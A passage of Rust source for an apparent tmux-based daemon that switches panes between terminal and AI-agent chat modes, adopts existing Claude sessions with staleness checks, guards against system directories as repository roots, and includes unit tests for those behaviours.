        if term.pane_mode != models::PaneMode::Agent {
            return Ok(restarted);
        }
        // The other way a pane leaves agent mode, and it needs the same
        // cleanup: this respawned the pane as a TUI, so that terminal's shim is
        // gone and everything the supervisor holds for it describes a process
        // that no longer exists.
        self.agents.left_agent_mode(id);
        // Told the truth about what is in the pane. The user can switch it back
        // to a chat, which respawns it as the shim properly.
        self.store.set_pane_mode(
            id,
            restarted.resource_version,
            models::PaneMode::Terminal,
            term.agent_session_id.clone(),
            // `update_terminal` above already bumped the epoch for this very
            // respawn. Bumping again here would count one new runtime twice.
            false,
        )
    }

    /// Record that a pane created with the changes preset is a changes pane.
    ///
    /// Written at creation rather than derived later from the preset, because
    /// the preset stops being true the moment anyone types into a pane and
    /// `pane_mode` is what every client switches on to decide which surface to
    /// draw. Hands back the updated record so the caller keeps a current
    /// `resource_version` — the versions are checked on every write after this.
    fn mark_changes_pane(
        &self,
        term: models::Terminal,
        command_preset: &str,
    ) -> Result<models::Terminal> {
        if command_preset != CHANGES_PRESET {
            return Ok(term);
        }
        self.store.set_pane_mode(
            term.id,
            term.resource_version,
            models::PaneMode::Changes,
            None,
            // Called from `create_terminal` and `split_terminal` on a terminal
            // whose window has not been made yet. Nothing is reading it.
            false,
        )
    }

    /// Write down the mode the pane is NOW in, against the version the row
    /// holds NOW.
    ///
    /// `term` is the record as it was read at the top of `set_pane_mode`, and
    /// the whole point of this function is that it does not write under that
    /// record's version. Everything between the read and here is slow and
    /// awaits: a tmux inventory refresh, a screen capture, a whole-host `ps`
    /// for adoption, and the respawn itself. Anything that writes the row in
    /// that window — most likely `AgentSupervisor::remember_session`, which a
    /// shim's `Established` now reaches SQLite through the moment it connects —
    /// makes the stale version lose, and the write is refused with
    /// `ResourceConflict`.
    ///
    /// Refusing it here is the worst of the three outcomes. The pane has
    /// ALREADY been respawned by the line above: the shim is running, the
    /// socket is bound, and the only thing left is to say so. A conflict at
    /// this point leaves the runtime in agent mode and the record saying
    /// terminal — the silent disagreement between record and runtime this
    /// whole design exists to prevent — and it leaves it there permanently,
    /// because nothing retries.
    ///
    /// The optimistic-concurrency guard is not lost by re-reading, because it
    /// was never doing the job here. Two clients toggling one pane both reach
    /// `respawn_pane`, and whichever ran last is what is in the pane; the
    /// version check could only ever make the record disagree with that, never
    /// prevent it. What still holds is that a terminal deleted underneath this
    /// fails as `NotFound` rather than resurrecting a row.
    ///
    /// The epoch moves, and this is the one caller of `store::set_pane_mode`
    /// for which it must: the program a client was reading is gone and a
    /// different one is writing to the same terminal id, so every byte offset
    /// held against it points into a stream that no longer exists.
    fn record_pane_mode(
        &self,
        term: &models::Terminal,
        pane_mode: models::PaneMode,
        session_id: Option<String>,
    ) -> Result<models::Terminal> {
        let expected = self.store.get_terminal(term.id)?.resource_version;
        self.store.set_pane_mode(term.id, expected, pane_mode, session_id, true)
    }

    /// Toggle a terminal between hosting a TUI and hosting an ACP agent.
    ///
    /// The pane is respawned rather than replaced, so the terminal keeps its
    /// id, its tag and its rectangle, and a chat opening in one tile of four
    /// does not rearrange the other three.
    pub async fn set_pane_mode(
        &self,
        id: Uuid,
        pane_mode: models::PaneMode,
        force: bool,
    ) -> Result<models::Terminal> {
        let term = self.store.get_terminal(id)?;
        let ws = self.store.get_workspace(term.workspace_id)?;

        // A changes pane is not a posture a pane is in, so it is not one this
        // can move to or from.
        //
        // Refused in both directions rather than silently doing the nearest
        // thing. Switching a changes pane to TERMINAL would respawn it as a
        // login shell — the pane would still be on screen, still be called
        // Changes by every client reading the record this call is about to
        // change, and be a shell. Switching some other pane INTO changes mode
        // would respawn whatever was running in it, which for an agent
        // mid-turn is work nobody can get back. Opening a changes pane is
        // `layout split --preset changes`; closing one is closing the pane.
        if term.pane_mode == models::PaneMode::Changes {
            return Err(DomainError::InvalidArgument {
                what: "a changes pane has no terminal to switch to; close it instead",
            });
        }
        if pane_mode == models::PaneMode::Changes {
            return Err(DomainError::InvalidArgument {
                what: "changes is a pane you open, not a mode you switch to",
            });
        }

        // `ConfirmationRequired` rather than a new code: a turn in flight is
        // exactly the existing "tell the user what this destroys and ask", and
        // `force` is the confirmation coming back.
        agent_supervisor::guard_toggle(self.agents.activity(id), force)
            .map_err(|_| DomainError::ConfirmationRequired)?;

        let snapshot = self.inventory.refresh().await;
        let pane = snapshot
            .claimants(id)
            .into_iter()
            .find(|p| p.proves_life())
            .ok_or(DomainError::NotFound)?;

        // A session id already declared at launch is reused; a hand-started
        // agent is looked up, and an ambiguous lookup refuses rather than
        // attaching a chat to the wrong conversation.
        let session_id = match term.agent_session_id.clone() {
            Some(existing) => Some(existing),
            // Adoption, and it has to be earned rather than assumed.
            //
            // Three things a SHELL pane switching to agent mode is asked for
            // before it may render an existing conversation: that no other
            // terminal already claims it, that the lookup was unambiguous, and
            // that the transcript is newer than the process running in this
            // pane. The third arrived last and is the reason for the `ps`
            // below. Until it did, this searched with a start time of the UNIX
            // epoch — older than every file on the disk, so the staleness
            // guard filtered nothing — and a pane in a reused worktree quietly
            // adopted the previous task's conversation, or another live pane's,
            // and then showed one transcript under two identities.
            //
            // What an honest floor costs, plainly: a claude that has not
            // written a transcript yet leaves nothing newer than itself to
            // find, so that pane adopts nothing and starts fresh. That is the
            // correct answer — there is no evidence tying any file in that
            // directory to this pane — and it will read as a regression to
            // anyone who had been relying on the stale adoption.
            None if self.pane_can_adopt_a_claude_session(id).await => {
                let home = directories::UserDirs::new()
                    .map(|d| d.home_dir().to_path_buf())
                    .ok_or(DomainError::NotFound)?;
                // Anything another terminal already claims is not ours to
                // take. Two panes rendering one conversation is worse than a
                // pane starting a fresh one.
                let claimed: Vec<String> = self
                    .store
                    .list_terminals_for_workspace(term.workspace_id)
                    .unwrap_or_default()
                    .into_iter()
                    .filter(|t| t.id != id)
                    .filter_map(|t| t.agent_session_id)
                    .collect();
                // The pid of what this pane is showing, which is what dates
                // the conversation. The whole-host walk is reused rather than
                // a second, narrower `ps` written next to it: this runs once,
                // on a person switching a pane into agent mode, alongside a
                // tmux refresh and a screen capture that each cost more.
                let pid = foreground::read()
                    .await
                    .pane(pane.tty.trim_start_matches("/dev/"))
                    .map(|running| running.pid);
                session_to_adopt(id, &home, Path::new(&ws.worktree_path), pid, &claimed).await
            }
            None => None,
        };

        // What the shim ACTUALLY has, preferred over what the record hoped for.
        //
        // A session is often not the one we asked for: `session/load` can fail
        // and the adapter starts a fresh one instead. Only the shim knows the
        // id that resulted, and it reports it in `Established`, which lived in
        // the supervisor's memory and nowhere else until
        // `AgentSupervisor::remember_session` started writing it down as it
        // arrives. Before both of those, the record kept a stale id: switching
        // back ran `claude --resume` on a conversation that was not the one on
        // screen, and switching in again failed to load it and opened a third.
        // Every toggle lost the thread and drew a gap saying so. This read
        // stays even now that the id is persisted, because it is still the
        // freshest answer at this instant and because a shim that has not
        // established yet has written nothing down.
        // The one comparison that can catch a wrong attach.
        //
        // Two facts exist here and were never checked against each other: what
        // this pane was AIMED at (the record, or what adoption just chose) and
        // what the shim actually ENDED UP in (`Established`). They differ
        // whenever `session/load` failed and the adapter opened a fresh
        // conversation instead. That substitution is invisible by
        // construction -- a transcript belonging to a different conversation
        // still looks like a transcript -- so a pane can render, and later
        // `--resume`, a thread the user never asked for with nothing anywhere
        // saying it happened.
        //
        // Warned rather than corrected: the shim's id is the true one and
        // preferring it is right. What was missing is that the disagreement
        // left no trace, which is exactly the case the owner asked to be able
        // to read out of a log.
        if let (Some(live), Some(wanted)) = (self.agents.session_id(id), session_id.as_ref()) {
            if &live != wanted {
                tracing::warn!(
                    terminal = %id,
                    wanted = %wanted,
                    got = %live,
                    "this pane is in a different conversation from the one it asked for"
                );
            }
        }
        let session_id = self.agents.session_id(id).or(session_id);

        // Named after the agent it is hosting, before the pane stops being able
        // to say. Every surface labels a terminal by what is running in it, and
        // in agent mode that is `farcooler agent-host` — so a Claude session
        // rendered natively appeared in the sidebar as "agent", which is the one
        // thing every agent pane has in common and therefore says nothing. The
        // screen is still the old agent's at this instant; a moment later it is
        // the shim's and the answer is gone.
        //
        // Computed here, ABOVE the command built below, because the `Agent` arm
        // needs it: the shim is handed `--preset` explicitly now rather than
        // guessing at one adapter for everything, and the preset it is handed
        // has to be this same value or the daemon's chat-capability check below
        // and the shim's own resolution could disagree.
        let harness = self
            .registry()
            .identify(
                &pane.command,
                &self.screen(id).await.map(|(text, _, _)| text).unwrap_or_default(),
            )
            .map(|rules| rules.preset.clone());

        let command = match pane_mode {
            // Already refused at the top of this function; spelled out rather
            // than folded into a wildcard so that a fourth mode arriving here
            // is a compile error instead of a pane quietly respawned as a
            // login shell.
            models::PaneMode::Changes => {
                return Err(DomainError::InvalidArgument {
                    what: "changes is a pane you open, not a mode you switch to",
                });
            }
            models::PaneMode::Terminal => {
                // The same builder `restart_terminal` uses, which is the
                // point: a pane going back to a TUI is one question with one
                // answer, however it got there. See `respawn_command`.
                let sid = session_id.clone().unwrap_or_default();
                let extras =
                    self.prepare_launch_hooks(&term.command_preset, &ws.worktree_path).await;
                respawn_command(
                    user_home().as_deref(),
                    &term.command_preset,
                    &ws.worktree_path,
                    &sid,
                    &extras,
                )
            }
            models::PaneMode::Agent => {
                let binary = shim_binary(std::env::current_exe().ok().as_deref());
                // `root`, not a second `runtime_dir` field: it is already where
                // this daemon's socket-bearing runtime state lives, and a
                // parallel field would only ever be able to agree with it or be
                // a bug.
                let socket = agent_supervisor::socket_path(&self.root, id).display().to_string();
                // Quoted, every one of them. tmux hands this string to a shell,
                // and a worktree under `~/My Projects` would otherwise split
                // into two words and take the whole feature down for anyone
                // whose paths have spaces in them. The binary path and the
                // socket path are just as capable of containing one.
                let session = session_id
                    .as_deref()
                    .map(|s| format!(" --session {}", shell_quote(s)))
                    .unwrap_or_default();
                // Quoted like every other interpolation here: tmux hands this
                // string to a shell, and a preset containing a space would
                // otherwise split into two arguments the shim never asked for.
                let preset = harness
                    .as_deref()
                    .map(|h| format!(" --preset {}", shell_quote(h)))
                    .unwrap_or_default();
                format!(
                    "{} agent-host --terminal {id} --socket {} --worktree {}{session}{preset}",
                    agent_program(&shell_quote(&binary)),
                    shell_quote(&socket),
                    shell_quote(&ws.worktree_path),
                )
            }
        };

        // An agent we cannot actually host is refused, not quietly replaced.
        //
        // The adapter is chosen by the shim, and it only knows one. So a Codex
        // pane switched to chat did not render Codex — it started a brand new
        // CLAUDE session in the same worktree and drew that instead, with
        // nothing anywhere saying the agent had been swapped. Losing the
        // toggle is a small disappointment; being handed a different agent
        // wearing the same pane is a much larger one.
        //
        // A pane with NO agent in it is refused for a related reason. It used
        // to be allowed, and `pane_can_adopt_a_claude_session` would then look
        // for a session to adopt — so switching a plain shell into chat showed
        // whatever conversation happened to be lying around in that worktree,
        // usually one belonging to a different pane.
        //
        // Checked BEFORE the bind below: a refused switch must not bind a
        // socket or spawn a listener for a shim that will never dial. That
        // listener is idempotent per terminal, so it would only ever be inert
        // rather than harmful — but it is still state created by a call that
        // then fails, and there is no reason to pay even that much for a
        // toggle that goes nowhere.
        if pane_mode == models::PaneMode::Agent {
            match harness.as_deref() {
                Some(h) if self.registry().chat_capable(h) => {}
                Some(_) => {
                    return Err(DomainError::InvalidArgument {
                        what: "this agent has no chat adapter; it stays in terminal mode",
                    });
                }
                None => {
                    return Err(DomainError::InvalidArgument {
                        what: "nothing in this pane is an agent",
                    });
                }
            }
        }

        // Bound BEFORE the pane is respawned. The shim dials on startup and
        // retries, so a later bind would still be found — but only after a
        // backoff the user spends staring at an empty chat, and only if the
        // retry loop outlives the gap.
        if pane_mode == models::PaneMode::Agent {
            self.agents.ensure_listening(&self.root, id);
        }

        // One line for both arms of the match above, and it has to be BELOW
        // the refusal rather than beside the build: a pane becoming a chat is
        // running an agent by construction, because everything else was just
        // turned back, and `harness` is what it actually holds. The record's
        // own preset may not agree yet — `a_pane_that_looks_like_claude` is a
        // terminal created as `shell` that Claude Code is running in, and
        // `preset_after_adopting` at the foot of this function is what finally
        // writes that down. Reading `command_preset` here would leave exactly
        // that pane, the one most likely to be a dispatched agent, filing its
        // board writes as a person.
        let command = with_pane_env(
            id,
            match pane_mode {
                models::PaneMode::Agent => harness.as_deref().unwrap_or(&term.command_preset),
                _ => &term.command_preset,
            },
            self.pane_task_key(&term).as_deref(),
            command,
        );

        #[cfg(test)]
        test_agent::refuse_a_real_agent(&command);
        self.tmux.respawn_pane(&pane.pane_id, &ws.worktree_path, &command).await?;
        let updated = self.record_pane_mode(&term, pane_mode, session_id)?;
        // The shim died with the pane the line above respawned. Nothing told
        // the supervisor that, so everything it held for this terminal went on
        // answering for a process that no longer exists — see
        // `left_agent_mode` for what is dropped and what deliberately is not.
        if pane_mode != models::PaneMode::Agent {
            self.agents.left_agent_mode(id);
        }
        let Some(harness) = harness.filter(|_| pane_mode == models::PaneMode::Agent) else {
            return Ok(updated);
        };
        let Some(preset) = preset_after_adopting(&updated.command_preset, &harness) else {
            return Ok(updated);
        };
        tracing::info!(
            terminal = %id,
            from = %updated.command_preset,
            to = %preset,
            "the pane hosts a different agent than its record named"
        );
        self.store.update_terminal(
            id,
            updated.resource_version,
            terminal_update(&updated, |u| u.command_preset = preset),
        )
    }

    /// Files in a workspace's worktree, for the `@`-mention picker.
    ///
    /// Substring match on the worktree-relative path, capped. Deliberately not
    /// a git call: an untracked file the agent just created is exactly the one
    /// a user wants to mention next.
    pub async fn search_worktree_files(
        &self,
        workspace_id: Uuid,
        query: &str,
        limit: u32,
    ) -> Result<Vec<String>> {
        let ws = self.store.get_workspace(workspace_id)?;
        let root = PathBuf::from(&ws.worktree_path);
        let needle = query.to_lowercase();
        let cap = if limit == 0 { 50 } else { limit.min(500) } as usize;

        let mut out = Vec::new();
        let mut stack = vec![root.clone()];
        while let Some(dir) = stack.pop() {
            let Ok(entries) = std::fs::read_dir(&dir) else { continue };
            for entry in entries.flatten() {
                let path = entry.path();
                let name = entry.file_name();
                let name = name.to_string_lossy();
                if SKIP_DIRS.contains(&name.as_ref()) {
                    continue;
                }
                if path.is_dir() {
                    stack.push(path);
                    continue;
                }
                let Ok(relative) = path.strip_prefix(&root) else { continue };
                let relative = relative.display().to_string();
                if needle.is_empty() || relative.to_lowercase().contains(&needle) {
                    out.push(relative);
                    if out.len() >= cap {
                        return Ok(out);
                    }
                }
            }
        }
        Ok(out)
    }

    // ---- runtime ----
    //
    // These operate on tmux alone and never touch the database, which is what
    // lets a client stream a terminal without going through the daemon at all.
    // They live on `Runtime`; `Service` exposes them for callers that already
    // hold one.

    pub fn runtime(&self) -> Runtime {
        // A clone, but not a copy: `LiveInventory` shares one `Arc` view, so
        // this is the same inventory rather than a second one that could
        // disagree with it.
        Runtime { tmux: self.tmux.clone(), inventory: self.inventory.clone() }
    }

    pub async fn send_input(&self, id: Uuid, data: &str) -> Result<()> {
        self.runtime().send_input(id, data).await
    }

    pub async fn send_bytes_hex(&self, id: Uuid, hex: &str) -> Result<()> {
        self.runtime().send_bytes_hex(id, hex).await
    }

    pub async fn screen(&self, id: Uuid) -> Result<(String, u32, u32)> {
        self.runtime().screen(id).await
    }

    /// The scrollback above a pane's screen, as bytes ready to feed. See
    /// `TerminalScreen.history`.
    pub async fn history(&self, id: Uuid, lines: u32) -> Result<Vec<u8>> {
        self.runtime().history(id, lines).await
    }

    pub async fn stream(&self, id: Uuid) -> Result<()> {
        self.runtime().stream(id).await
    }

    /// Which run of this terminal a client is looking at.
    ///
    /// From the record rather than from tmux, because that is where a restart
    /// increments it — see `restart_terminal`. A client that reattaches and gets
    /// a different epoch is holding a picture of a program that no longer
    /// exists, and must replace rather than append. See
    /// `TerminalAttachResult.epoch`.
    pub fn terminal_epoch(&self, id: Uuid) -> Result<u64> {
        Ok(self.store.get_terminal(id)?.epoch)
    }

    pub async fn input_channel(&self, id: Uuid) -> Result<()> {
        self.runtime().input_channel(id).await
    }

    pub async fn resize_terminal(&self, id: Uuid, columns: u32, rows: u32) -> Result<()> {
        self.runtime().resize_terminal(id, columns, rows).await
    }

    /// The escape sequences that put a fresh emulator into the modes this
    /// pane's program is in. See `TerminalScreen.modes`.
    pub async fn pane_modes(&self, id: Uuid) -> Result<String> {
        self.runtime().pane_modes(id).await
    }

    /// Where the cursor is, so a client can draw it in the right cell.
    pub async fn cursor(&self, id: Uuid) -> Result<(u32, u32)> {
        self.runtime().cursor(id).await
    }


    /// Whether the pane's program has asked for bracketed paste.
    pub async fn pane_bracketed_paste(&self, id: Uuid) -> Result<bool> {
        self.runtime().pane_bracketed_paste(id).await
    }

    /// Type a path into a terminal, as a paste.
    ///
    /// The daemon does this rather than handing the path back for the client to
    /// send, because the bracketing depends on a mode only the runner holding
    /// the pane can answer for, and because the CLI form of this has no
    /// terminal emulator to encode with.
    ///
    /// A trailing space so the next word does not glue to `.png`, and never a
    /// newline: nothing is submitted on anyone's behalf.
    pub async fn paste_path(&self, id: Uuid, path: &str) -> Result<()> {
        let bracketed = self.pane_bracketed_paste(id).await?;
        let text = format!("{} ", crate::pastes::quote_for_paste(path));
        self.send_bytes(id, &crate::pastes::encode_paste(bracketed, &text)).await
    }

    /// Send exact bytes to a terminal.
    ///
    /// Bytes rather than text, because a key is not always a character: arrows,
    /// Ctrl-C and a bracketed paste are byte sequences, and anything re-encoding
    /// them on the way would need to know the terminal's mode to get them right.
    pub async fn send_bytes(&self, id: Uuid, payload: &[u8]) -> Result<()> {
        let hex: String = payload.iter().map(|b| format!("{b:02x}")).collect();
        self.runtime().send_bytes_hex(id, &hex).await
    }

    pub async fn capture(&self, id: Uuid, lines: u32) -> Result<String> {
        self.runtime().capture(id, lines).await
    }

    // ---- derivation ----

    /// The live runtime view as of the last refresh.
    /// Compare what the inventory believes against what tmux says.
    ///
    /// Exposed so the watcher can run it: `LiveInventory::backstop_reconcile`
    /// existed with no callers, which meant the defect it detects — a missed
    /// control-mode notification — could never be reported.
    pub async fn backstop_reconcile(&self) {
        self.inventory.backstop_reconcile().await;
    }

    pub fn inventory_snapshot(&self) -> farcooler_core::inventory::RuntimeSnapshot {
        self.inventory.snapshot()
    }

    fn derive_one(&self, term: &models::Terminal) -> DerivedTerminal {
        let snapshot = self.inventory.snapshot();
        derive::derive_terminal(&to_record(term), &snapshot)
    }

    /// One workspace with every state derived fresh.
    pub async fn workspace_view(&self, ws: &models::Workspace) -> Result<WorkspaceView> {
        let snapshot = self.inventory.snapshot();
        let terminals = self.store.list_terminals_for_workspace(ws.id)?;

        let views: Vec<TerminalView> = terminals
            .into_iter()
            .map(|t| {
                let derived = derive::derive_terminal(&to_record(&t), &snapshot);
                TerminalView { terminal: t, derived }
            })
            .collect();

        let pairs: Vec<_> = views
            .iter()
            .map(|v| (to_record(&v.terminal), v.derived.clone()))
            .collect();

        let state = derive::derive_workspace(
            ws.hidden,
            ws.worktree_missing,
            ws.creation_failed,
            &pairs,
        );

        Ok(WorkspaceView { workspace: ws.clone(), state, terminals: views })
    }

    /// The whole fleet, refreshed once. One inventory query, not one per terminal.
    pub async fn fleet(&self) -> Result<Vec<WorkspaceView>> {
        self.inventory.refresh().await;
        let mut out = Vec::new();
        for ws in self.list_workspaces()? {
            out.push(self.workspace_view(&ws).await?);
        }
        Ok(out)
    }
}

pub(crate) fn to_record(t: &models::Terminal) -> derive::TerminalRecord {
    derive::TerminalRecord {
        id: t.id,
        workspace_id: t.workspace_id,
        intent: t.intent,
        runtime_confirmed: t.runtime_confirmed,
        exit_code: t.exit_code,
        exit_signal: t.exit_signal,
    }
}

fn terminal_update(
    t: &models::Terminal,
    f: impl FnOnce(&mut models::TerminalUpdate),
) -> models::TerminalUpdate {
    let mut u = models::TerminalUpdate {
        title: t.title.clone(),
        command_preset: t.command_preset.clone(),
        intent: t.intent,
        runtime_confirmed: t.runtime_confirmed,
        exit_code: t.exit_code,
        exit_signal: t.exit_signal,
        lease_generation: t.lease_generation,
        epoch: t.epoch,
        columns: t.columns,
        rows: t.rows,
    };
    f(&mut u);
    u
}

/// Refuse `/`, a home directory root, and system directories.
///
/// What this is handed has already been through `Path::canonicalize`, because
/// `add_root` resolves before it asks — and on macOS that is not the path the
/// person typed. `/etc`, `/var` and `/tmp` are symlinks into `/private`, so the
/// guard is shown `/private/etc` and a list of prefixes named after the
/// spellings a person uses misses every one of them. That is why the `/private`
/// canonicalizing prepends is taken back off first: the names below can then
/// stay the ones a person would recognize, and they match on either platform.
///
/// `/var/folders` is carved back out, and deliberately rather than by accident.
/// It is not a system location: it is the per-user scratch tree Darwin hands
/// out as `$TMPDIR`, owned by the invoking user, and refusing it would refuse
/// every temp directory on a Mac. Measured cost of not carving it out: 83 tests
/// across `farcooler-daemon` and `farcooler-client` that add a temp directory as
/// a root, plus anyone trying Far Cooler on a scratch checkout. It protects
/// nothing in exchange — everything under it already belongs to this user.
///
/// `/tmp` is absent for the same reason and always has been. It is shared
/// scratch space, not somewhere the system keeps its own files, and on Linux it
/// is where `$TMPDIR` points.
fn reject_sensitive_root(path: &Path) -> Result<()> {
    let resolved = path.to_string_lossy();
    // Undo what canonicalizing added, so one list covers both spellings.
    let path = Path::new(
        resolved.strip_prefix("/private").filter(|rest| rest.starts_with('/')).unwrap_or(&resolved),
    );

    // Whole components, not a string prefix: `/variants` is not `/var`.
    let under = |prefix: &str| path.starts_with(prefix);
    let sensitive = path == Path::new("/")
        || path == Path::new("/private")
        || under("/System")
        || under("/Library")
        || under("/usr")
        || under("/bin")
        || under("/sbin")
        || under("/etc")
        || (under("/var") && !under("/var/folders"));

    if sensitive {
        return Err(DomainError::SensitiveRoot);
    }

    if let Some(home) = std::env::var_os("HOME")
        && Path::new(&home) == path
    {
        return Err(DomainError::SensitiveRoot);
    }
    Ok(())
}

fn now_millis() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as i64)
        .unwrap_or(0)
}

/// This user's own `~/.ssh/authorized_keys`.
///
/// An empty path when there is no home directory to speak of, which the fence
/// writer turns into a refusal rather than a guess — the alternative is writing
/// keys into whatever the process's working directory happens to be.
fn default_authorized_keys() -> PathBuf {
    directories::UserDirs::new()
        .map(|dirs| dirs.home_dir().join(".ssh").join("authorized_keys"))
        .unwrap_or_default()
}

/// Derive a stable UUID from the install id so the daemon identity survives
/// restarts and previously written tags remain provable.
///
/// `pub` because it is on the wire now: `Host.runner_id` is this value, and a
/// device records it to remember which runner it enrolled on. It is a name
/// rather than a secret — it is already the tmux socket's name and the marker
/// on every worktree this install owns.
pub fn stable_host_id(install_id: &str) -> Uuid {
    let mut bytes = [0u8; 16];
    for (i, b) in install_id.as_bytes().iter().enumerate() {
        bytes[i % 16] ^= *b;
    }
    Uuid::from_bytes(bytes)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A scratch `$HOME` and a scratch worktree, wired the way Claude Code
    /// wires them: `~/.claude/projects/<munged realpath of the worktree>`.
    ///
    /// The REALPATH, because on macOS a `TempDir` lands under `/var`, which is
    /// a symlink into `/private/var`, and Claude Code munges the resolved cwd.
    fn adoption_scratch() -> (tempfile::TempDir, tempfile::TempDir, PathBuf) {
        let home = tempfile::tempdir().unwrap();
        let worktree = tempfile::tempdir().unwrap();
        let resolved = std::fs::canonicalize(worktree.path()).unwrap();
        let munged = session_discovery::project_dir_name(&resolved);
        let projects = home.path().join(".claude/projects").join(munged);
        std::fs::create_dir_all(&projects).unwrap();
        (home, worktree, projects)
    }

    /// Move a file's mtime into the past, so it predates this test process.
    ///
    /// The floor under test is when a process started, and the only process
    /// this test can honestly ask about is itself. So "older than the pane"
    /// has to mean "older than this binary", and the only way to write a file
    /// older than a program that is already running is to backdate it.
    fn backdate(path: &Path, seconds_ago: u64) {
        let when = std::time::SystemTime::now() - std::time::Duration::from_secs(seconds_ago);
        let secs = when.duration_since(std::time::UNIX_EPOCH).unwrap().as_secs();
        let stamp = libc::timeval { tv_sec: secs as libc::time_t, tv_usec: 0 };
        let times = [stamp, stamp];
        let c_path = std::ffi::CString::new(path.as_os_str().as_encoded_bytes()).unwrap();
        // SAFETY: `utimes` reads a NUL-terminated path and a two-element
        // `timeval` array, both of which outlive the call.
        let rc = unsafe { libc::utimes(c_path.as_ptr(), times.as_ptr()) };
        assert_eq!(rc, 0, "could not backdate {}", path.display());
    }

    /// THE test for this path, and it is a test of the CALLER.
    ///
    /// `session_discovery` already pins what `started_after` does when it is
    /// given a real value — `a_session_older_than_the_pane_is_not_a_candidate`
    /// has passed since the day it was written. What nothing could see is that
    /// production handed that parameter `SystemTime::UNIX_EPOCH`, which is
    /// older than every file on every disk, so the filter removed nothing and
    /// a pane in a reused worktree adopted the previous task's conversation.
    /// A guard whose only test calls past the code that disables it is not a
    /// guard.
    ///
    /// So this calls `session_to_adopt`, which is the function that CHOOSES
    /// the floor, and hands it a live pid — this process — with a transcript
    /// backdated to before this process started. Put the epoch back at the
    /// call site and the stale file becomes the sole candidate and is adopted,
    /// and this goes red.
    #[tokio::test]
    async fn a_transcript_older_than_the_process_in_the_pane_is_not_adopted() {
        let (home, worktree, projects) = adoption_scratch();
        let stale = projects.join("last-months-task.jsonl");
        std::fs::write(&stale, "{}").unwrap();
        backdate(&stale, 3600);

        let mine = Some(std::process::id() as i32);
        let adopted =
            session_to_adopt(Uuid::nil(), home.path(), worktree.path(), mine, &[]).await;
        assert_eq!(adopted, Option::None, "a file older than the pane is not this pane's");
    }

    /// The other half, without which the test above passes for the wrong
    /// reason.
    ///
    /// A floor of "now", or of any moment in the future, would refuse
    /// everything and satisfy the assertion above while breaking adoption
    /// outright. This pins that a transcript written AFTER the process in the
    /// pane started is still adopted, which is the behaviour the feature
    /// exists for.
    #[tokio::test]
    async fn a_transcript_written_after_the_process_started_is_adopted() {
        let (home, worktree, projects) = adoption_scratch();
        // Written now, and this test binary started before now.
        std::fs::write(projects.join("this-panes-conversation.jsonl"), "{}").unwrap();

        let mine = Some(std::process::id() as i32);
        let adopted =
            session_to_adopt(Uuid::nil(), home.path(), worktree.path(), mine, &[]).await;
        assert_eq!(adopted.as_deref(), Some("this-panes-conversation"));
    }

    /// No start time means no adoption — never a floor invented to stand in
    /// for one.
    ///
    /// This is the shape the original bug would come back in: a `ps` that
    /// fails, a pid that has gone, a pane with nothing in the foreground, and
    /// somewhere a `.unwrap_or(UNIX_EPOCH)` to keep the code tidy. That
    /// fallback is the defect, reintroduced behind a fresh coat of paint, so
    /// the adoptable transcript here is deliberately a good one: only a
    /// refusal that comes from not knowing the floor can leave it alone.
    #[tokio::test]
    async fn a_pane_with_no_readable_start_time_adopts_nothing() {
        let (home, worktree, projects) = adoption_scratch();
        std::fs::write(projects.join("perfectly-adoptable.jsonl"), "{}").unwrap();

        // The `ps` walk named no foreground process for this pane's tty.
        let none = session_to_adopt(Uuid::nil(), home.path(), worktree.path(), None, &[]).await;
        assert_eq!(none, Option::None);

        // A pid `ps` will not answer for: the process is gone, or never was.
        let gone =
            session_to_adopt(Uuid::nil(), home.path(), worktree.path(), Some(i32::MAX), &[])
                .await;
        assert_eq!(gone, Option::None);
    }

    /// Recency is necessary and not sufficient: a fresh transcript another
    /// terminal already holds still belongs to that terminal.
    ///
    /// Two panes rendering one conversation under two identities is the
    /// failure this exclusion exists for, and it now lives in
    /// `session_to_adopt` rather than inline in `set_pane_mode`, so it is
    /// tested here.
    #[tokio::test]
    async fn a_transcript_another_terminal_claims_is_not_adopted() {
        let (home, worktree, projects) = adoption_scratch();
        std::fs::write(projects.join("pane-ones-conversation.jsonl"), "{}").unwrap();

        let mine = Some(std::process::id() as i32);
        let claimed = ["pane-ones-conversation".to_string()];
        let adopted =
            session_to_adopt(Uuid::nil(), home.path(), worktree.path(), mine, &claimed).await;
        assert_eq!(adopted, Option::None);
    }

    #[test]
    fn presets_run_through_an_interactive_login_shell() {
        // Real names: this checks the exact string the builder writes, and launches nothing.
        let _real = crate::service::test_agent::real_names();
        // Startup files, version managers, direnv and aliases must behave like a
        // hand-launched terminal.
        // Quoted now, because a preset may carry a model.
        assert!(preset_command_with_hooks("claude", None, &LaunchExtras::NONE).contains("-ilc 'claude'"));
        assert!(preset_command_with_hooks("shell", None, &LaunchExtras::NONE).ends_with("-il"));
        assert!(preset_command_with_hooks("cursor", None, &LaunchExtras::NONE).contains("cursor-agent"));
    }

    /// The guard is asked about the path `add_root` canonicalized, so this asks
    /// it the same way.
    ///
    /// The literal spellings alone are what let a real hole survive: on macOS
    /// `/etc` and `/var` are symlinks into `/private`, `add_root` canonicalizes
    /// before it asks, and a test that only ever hands over `/etc` cannot see
    /// that the guard is never shown `/etc` in production.
    ///
    /// Every prefix the guard lists appears here, because an arm no input
    /// reaches is an arm any mistake can be made in.
    #[test]
    fn sensitive_roots_are_refused_as_add_root_spells_them() {
        let mut cases = vec!["/", "/usr", "/usr/local", "/bin", "/sbin", "/etc", "/var", "/var/log"];
        // Neither exists on Linux, and `canonicalize` fails outright on a path
        // that is not there.
        if cfg!(target_os = "macos") {
            cases.extend(["/System", "/Library", "/System/Library"]);
        }

        for p in cases {
            let literal = Path::new(p);
            assert!(
                reject_sensitive_root(literal).is_err(),
                "{p} should be refused as a repository root"
            );

            // `add_root` never gets to ask about anything else.
            let canonical = literal.canonicalize().unwrap_or_else(|e| panic!("{p}: {e}"));
            assert!(
                reject_sensitive_root(&canonical).is_err(),
                "{p} canonicalizes to {} and must be refused by that name too",
                canonical.display()
            );
        }
    }

    /// The `/private` spelling is refused everywhere, not only where macOS
    /// produces it.
    ///
    /// Unguarded by `cfg`, deliberately: this is the guard's own logic, it is
    /// the same on both platforms, and the Linux half of the CI matrix would
    /// otherwise never reach the code that closes the macOS hole. A guard only
    /// one runner exercises is a guard half of CI cannot break.
    #[test]
    fn the_private_spelling_macos_produces_is_refused_too() {
